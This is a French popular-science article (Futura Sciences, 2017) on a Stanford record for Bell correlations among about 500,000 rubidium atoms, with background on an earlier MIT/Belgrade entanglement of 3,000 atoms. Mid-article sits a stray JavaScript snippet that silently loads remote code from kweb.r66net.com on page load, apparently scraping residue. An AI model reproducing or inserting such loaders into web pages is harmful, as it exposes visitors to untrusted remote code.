{"title": "Intrication quantique : un nouveau record avec 500.000 atomes", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-04-18", "content": "Decouvert, sur le plan theorique, par Schrodinger et Einstein vers 1935, le phenomene d'intrication quantique peut etre mis a profit pour creer des qubits. Il faut cependant pouvoir intriquer le plus grand nombre possible de particules car c'est l'une des cles de la revolution des ordinateurs quantique. Des chercheurs viennent de battre un record en obtenant des correlations de Bell avec 500.000 atomes. Ce qu'il faut retenir Il y a deux problemes centraux a resoudre pour fabriquer des ordinateurs quantiques performants, contourner l'obstacle de la decoherence et obtenir beaucoup de qubits intriques. En ce qui concerne les grands nombres d'atomes intriques, mais pas maximalement, un record avec les fameuses correlations de Bell de l'effet E.P.R a ete obtenu avec environ 500.000 atomes de rubidium 87 et en utilisant des etats de spin comprimes. Interview : en quoi un ordinateur quantique est-il different ?                       Le monde quantique est fascinant : a cette echelle, par exemple, les objets peuvent se trouver simultanement dans plusieurs etats. Exploitant ce principe, un ordinateur quantique aurait des possibilites bien plus vastes qu'un modele classique. Dans le cadre de sa serie de videos Questions d'experts, sur la physique et l'astrophysique, l'editeur De Boeck a interroge Claude Aslangul, professeur a l'UPMC, afin qu'il nous explique le fonctionnement de cette etrange machine.                                       Il est difficile de predire ce qu'il va advenir des applications technologiques dans ce nouveau domaine de la physique qu'est l'information quantique. La  cryptologie  quantique se developpe deja mais ce que les chercheurs attendent, ce sont les mythiques  ordinateurs quantiques . Plusieurs laboratoires estiment realiser des progres notables en direction, au moins, des calculateurs quantiques performants. Il ne s'agirait pas de vrais ordinateurs programmables mais peut-etre battront-ils des superordinateurs classiques sur des problemes bien specifiques.  En tout etat de cause, pour toutes ces machines, deux problemes sont a resoudre. Le premier est celui de la decoherence, qui perturbe et rend d'autant plus difficile l'execution des calculs quantiques avec des  qubits  qu'ils sont nombreux. Le second est, justement, de disposer d'un grand nombre de qubits en etat d'intrication. Il est possible de verifier qu'un ensemble de systemes quantiques individuels sont bien intriques en mettant en evidence des << correlations de Bell >>, du nom du physicien irlandais  John Bell  qui les a decouvertes dans le formalisme de la theorie quantique interpretee dans le cadre de la fameuse  interpretation de Copenhague . Ces correlations ont ete mises en evidence avec l'effet EPR en 1982 grace a l'experience d' Alain Aspect  et ses collegues. Elle a montre que les correlations de la  mecanique quantique  violaient une inegalite mathematique devenue aujourd'hui fameuse. John Bell devant le tableau noir dans son bureau au Cern. On peut y voir tout en haut la fameuse inegalite qu'il a demontree en 1964, au-dessus d'un schema montrant le principe de l'experience realisee en 1982 avec des paires de photons polarises par Alain Aspect et ses collegues. (c) Cern                               L'intrication quantique d'etats de spin comprimes Une equipe de chercheurs de l'universite de Stanford vient d'etablir un resultat remarquable avec un grand nombre d' atomes  intriques. Ils ont montre qu'ils etaient parvenus a etablir des correlations de Bell avec pres de 500.000 atomes... Il s'agit, en l'occurrence, de  rubidium  87, comme les physiciens l'expliquent dans un article publie dans  Physical Review Letters . On pourrait croire que cet exploit pulverise le record du nombre d'atomes intriques detenu par une equipe de physiciens du MIT et de l'universite de Belgrade, egalement avec des atomes de  87 Rb, au nombre de 3.000 environ (voir l'article ci-dessous). Mais, comme nous allons le voir, la realite est plus nuancee.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Toujours est-il que pour atteindre ce resultat, les chercheurs ont produit ce qu'ils appellent des etats de spin comprimes (en anglais  spin-squeezed states ). Il s'agit d'une variante un peu subtile des  etats comprimes  realises par exemple avec des oscillateurs quantiques et de la  lumiere . Les physiciens savent qu'il n'est pas possible d'attribuer une valeur precise simultanement a la position et a la  quantite de mouvement  d'une particule, et que le produit de l'erreur sur la position par celle sur la quantite de mouvement doit etre plus grand que la  constante de Planck  divisee par 2p. Il s'agit d'une des fameuses  inegalites de Heisenberg . Il est parfois possible de s'arranger pour que l'etat quantique de la particule soit tel que ce produit soit minimal, donc egal a h/2p. C'est alors qu'on parle d'etat comprime et pour une bonne raison puisque, en quelque sorte, les erreurs sont reduites, comprimees. Il s'agit d'un cas particulier d'un phenomene plus general car les inegalites de Heisenberg apparaissent dans certains cas parce que des paires de grandeurs  physiques  considerees sont decrites mathematiquement par des quantites dont le produit ne commute pas. C'est ce qui se produit avec certaines composantes du  moment cinetique , et meme du spin des particules, et c'est pourquoi on peut obtenir egalement des etats comprimes decrivant ces grandeurs. Bientot docteur, le physicien Rajiv Krishnakumar a participe a l'experience ayant conduit a l'obtention de correlations de Bell avec environ 500.000 atomes. (c) Rajiv Krishnakumar                               Le record de correlations de Bell Rajiv Krishnakumar a participe a l'experience de l'universite de Stanford et il a fourni a Futura quelques precisions sur le travail realise par lui et ses collegues:  << Je voudrais attirer votre attention sur un point certes subtil mais important : l'intrication n'est pas une quantite binaire mais une quantite continue variable. Il existe ainsi un niveau maximum d'intrication possible entre des atomes. A cet egard, c'est vrai qu'on utilise 500.000 atomes dans notre  experience mais ces atomes ne sont pas intriques au maximum et, en fait, notre resultat correspond a une experience ou on intriquerait environ 1.600 atomes au maximum. Donc, malheureusement, nous n'avons pas battu le record des scientifiques du MIT et de Belgrade sur ce plan. Toutefois, l'etat cree dans notre experience a battu le record de l'etat ayant le maximum de correlations de Bell, c'est-a-dire l'etat qui, jusqu'a present et techniquement parlant, viole l'inegalite de Bell au maximum. >> Le chercheur ajoute qu' << il n'existe pas encore, a notre connaissance, une facon raisonnable de mesurer les correlations de Bell de l'etat quantique cree par le groupe de MIT et Belgrade (bien qu'il puisse y en avoir). Les correlations de Bell sont des observations tres interessantes et profondes, et qui pourraient peut-etre un jour avoir une utilite technologique (reste a voir !) >> . Pour en savoir plus Une intrication avec 3.000 atomes Article de  Laurent Sacco  publie le 13/04/2015 Bien qu'elle n'ait pas encore directement d' application  dans le domaine des  ordinateurs quantiques , une performance d'une equipe de physiciens du MIT et de l'universite de Belgrade merite d'etre saluee. Les chercheurs ont en effet reussi a intriquer 3.000 atomes a l'aide d'une impulsion  laser  contenant un seul  photon . Ce nouveau record d'intrication va permettre de fabriquer des  horloges atomiques  plus precises. L'information quantique fascine. Notamment parce qu'on y parle de teleportation et d'ordinateurs quantiques avec parfois un parfum de reves de Science-fiction. Cette nouvelle science a deja une application bien concrete, la  cryptographie quantique . Mais a moins que la societe  D Wave Systems  ait bel et bien reussi son pari en creant les premiers calculateurs quantiques performants, tous ces reves sont encore hors de portee pour longtemps dans le cas des  ordinateurs quantiques . En effet, meme pour realiser des simulateurs quantiques puissants comme ceux imagines par  Richard Feynman , il faut disposer d'un grand nombre de qubits. Plus precisement il faut reussir a obtenir un grand nombre de systemes physiques portant chacun un bit d'information quantique qui soient intriques. Rappelons que l' intrication quantique  a ete decouverte theoriquement et simultanement par Schrodinger et  Einstein . Leurs idees a ce sujet ont ete publiees en 1935 dans le cadre de deux experiences de pensee desormais celebre, celle du  chat de Schrodinger  et celle du  paradoxe EPR . La condition d'intrication est necessaire pour pouvoir beneficier des lois de la mecanique quantique pour effectuer des sortes de calculs en parallele susceptibles de surpasser largement ceux que peuvent effectuer les  supercalculateurs  dans certains cas. Malheureusement, le phenomene de decoherence limite le temps imparti a ces calculs d'autant plus fortement qu'ils sont faits avec un grand nombre de qubits. La caracteristique d'une horloge atomique est d'utiliser des atomes en guise de balancier : leurs oscillations sont en effet parfaitement stables et reproductibles. La duree d'observation de ces oscillations est cruciale : plus elle est longue, meilleure sera l'horloge. Le projet de recherche Fontaine continue suisse (FOCS) a permis de construire des horloges atomiques parmi les plus precises du monde. On voit ici FOCS 1 qui est la premiere horloge atomique utilisant un jet continu d'atomes froids. FOCS 1 ne derive que d'une seconde en 30 millions d'annees. (c) Metas                               Des horloges qui ne retarderaient que d'une minute depuis le Big Bang L'annonce faite recemment par une equipe de physiciens du MIT et de l'universite de Belgrade dans un article de  Nature  merite en tout cas d'etre saluee. Les chercheurs ont en effet mis au point une technique qui, non seulement leur a permis de battre un record en intriquant 3.000 atomes alors que les precedents etaient de l'ordre de la centaine, en n'utilisant qu'un seul photon. Les physiciens n'avaient cependant pas pour but initial de progresser dans le domaine des  simulateurs  et des ordinateurs quantiques, mais bien dans celui des horloges atomiques. Les horloges atomiques modernes, cousines de celles issues des travaux par  Norman Ramsey , font usage d'atomes refroidis et pieges a basse temperature a l'aide de  lasers . Leur precision est proportionnelle a la racine carree du nombre d'atomes utilises. Mais si ceux-ci sont intriques, la performance obtenue est directement proportionnelle au nombre d'atomes, ce qui permet evidemment de repousser plus facilement les limites des horloges atomiques. Celles que l'on sait faire aujourd'hui sont si precises qu'elles ne derivent que d'une minute tout au plus sur une  duree  de l'ordre de l'age de l' Univers  observable, c'est-a-dire 13,8 milliards d'annees. Gagner encore en precision va permettre d'ameliorer des technologies deja existantes comme le  GPS  ou celles des telecommunications. On peut esperer faire aussi de nouvelles decouvertes en physique, par exemple, en mettant en evidence une infime variation dans le temps de certaines constantes fondamentales. ", "theme": "sciences"}